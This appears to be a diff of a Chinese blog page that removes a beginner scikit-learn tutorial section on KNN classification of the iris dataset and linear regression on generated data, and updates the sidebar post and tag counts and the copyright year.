-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import numpy</span><br><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from sklearn.neighbors import KNeighborsClassifier</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line">iris_y = iris.target</span><br><span class="line">#print(iris_y)</span><br><span class="line"></span><br><span class="line">x_trian,x_test,y_train,y_test = train_test_split(iris_x,iris_y,test_size=0.25)</span><br><span class="line"></span><br><span class="line">#print(y_train)</span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">knn.fit(x_trian,y_train)</span><br><span class="line">y_predict = knn.predict(x_test)</span><br><span class="line"></span><br><span class="line">print(y_predict)</span><br><span class="line">pritn(y_test)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>上面的代码从sklearn的数据库导入了鸢尾花数据集，然后将data作为特征，target作为标签。</li>
-<li>然后通过train_test_split方法将特征和标签分成训练集和测试集并打乱顺序，其中test_size控制测试集占比0.25。</li>
-<li>然后使用KNeighborsClassifier机器学习方法，学习训练集，并用训练好的模型预测测试集中x_test对应的分类结果。</li>
-<li>最后将预测的分类结果y_predict与原始数据中的分类结果y_test输出后对比</li>
-</ul>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn04.png?raw=true" alt=""></p>
-<p>从最终输出结果可以看到，基本都预测成功了，如果我们样本量更大一点，或许会找到一些错误预测结果。</p>
-<h2 id="0x05-scikit-learn学习与预测（回归问题）"><a href="#0x05-scikit-learn学习与预测（回归问题）" class="headerlink" title="0x05 scikit-learn学习与预测（回归问题）"></a>0x05 scikit-learn学习与预测（回归问题）</h2><p>再使用datasets中提供的自动生成数据的方法来预测一个回归问题。同样先贴代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.linear_model import LinearRegression</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">example_x,example_y = datasets.make_regression(n_samples=100,n_features=1,n_targets=1,noise=3)</span><br><span class="line"></span><br><span class="line">plt.scatter(example_x,example_y)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">lr = LinearRegression()</span><br><span class="line">lr.fit(example_x,example_y)</span><br><span class="line"></span><br><span class="line">print(lr.predict(example_x[:5,:]))</span><br><span class="line">print(example_y[:5])</span><br></pre></td></tr></table></figure>
-<ul>
-<li>上面代码中，首先使用make_regression生成随机的回归数据，其中n_samples代表数据数量，n_features代表特征数量，n_targets代表特征数量，noise代表噪声大小</li>
-<li>然后使用matplotlib模块将生成的二维数据绘制出来</li>
-<li>接着使用LinearRegression机器学习方法，学习训练集，并用训练好的模型预测样本中前五个数据</li>
-<li>最后将预测结果与原始数据的标签值输出进行对比</li>
-</ul>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn05.png?raw=true" alt=""></p>
-<p>从二维图形可以看出生成数据的分布。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn06.png?raw=true" alt=""></p>
-<p>从输出结果可以看出，预测结果基本符合，但是有一定的误差。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2520,7 +2515,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">115</span>
+                <span class="site-state-item-count">120</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2542,7 +2537,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">68</span>
+                <span class="site-state-item-count">72</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2584,7 +2579,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
